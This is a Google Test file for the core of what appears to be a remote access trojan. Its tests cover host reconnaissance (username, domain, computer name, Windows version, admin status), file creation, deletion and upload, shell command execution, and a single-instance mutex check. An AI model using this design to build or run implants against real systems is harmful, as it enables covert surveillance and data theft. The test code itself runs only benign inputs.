#include "core.hpp"
#include <gtest/gtest.h>


TEST(RatCoreTests, GetCountryCode) {

    std::string countryCode = Recon::LocalSystem::GetCountryCode();
    std::string actual = "US";

    EXPECT_STREQ(countryCode.c_str(), actual.c_str());
}

TEST(RatCoreTests, GetDomainName) {

    std::string domainName = Recon::LocalSystem::GetSystemDomainName();
    std::string noteq = "Unable to get domain name";

    EXPECT_NE(domainName.c_str(), noteq.c_str());
}

TEST(RatCoreTests, GetSystemName) {

    std::string computerName = Recon::LocalSystem::GetSystemComputerName();
    std::string noteq = "Unable to retrieve computer name";

    EXPECT_NE(computerName.c_str(), noteq.c_str());
}

TEST(RatCoreTests, GetWindowsVersion) {

    std::string version = Recon::LocalSystem::GetWindowsVersion();

    EXPECT_NE(version.find("Build"), std::string::npos);
}

TEST(RatCoreTests, GetSystemUsername) {

    std::string username = Recon::LocalSystem::GetSystemUsername();
    std::string noteq = "Unable to retrieve username";

    EXPECT_NE(username.c_str(), noteq.c_str());
}

TEST(RatCoreTests, IsProcessAdmin) {

    ASSERT_NO_THROW(Recon::LocalSystem::IsProcessAdmin());
}

TEST(RatCoreTests, cmdCreateFile) {

    ASSERT_NO_THROW(Commands::cmdCreateFile("test_file.txt", "dGVzdF9kYXRh"));
}

TEST(RatCoreTests, cmdDeleteFile) {

    if (Commands::cmdCreateFile("deleteme.txt", "dGVzdF9kYXRh") == 0)
        ASSERT_NO_THROW(Commands::cmdDeleteFile("deleteme.txt"));
}

TEST(RatCoreGuardrailsTests, CheckCreateMutexCreated) {

    EXPECT_TRUE(Guardrails::CheckCreateMutex());
}

TEST(RatCoreTests, cmdExecuteCommand) {

    std::string output_data = Commands::cmdExecuteCommand("echo test_command");

    std::string test_string = "test_command\r\n";
    EXPECT_STREQ(output_data.c_str(), test_string.c_str());
}

TEST(RatCoreGuardrailsTests, CheckCreateMutexExists) {

    if (Guardrails::CheckCreateMutex()) {
        Sleep(1000);
        EXPECT_FALSE(Guardrails::CheckCreateMutex());
    }
}

TEST(RatCoreTests, cmdUploadFile) {

    if (Commands::cmdCreateFile("uploadme.txt", "dGVzdF9kYXRh") == 0) {
        ASSERT_NO_THROW(Commands::cmdUploadFile("uploadme.txt"));
        Commands::cmdDeleteFile("uploadme.txt");
    }
}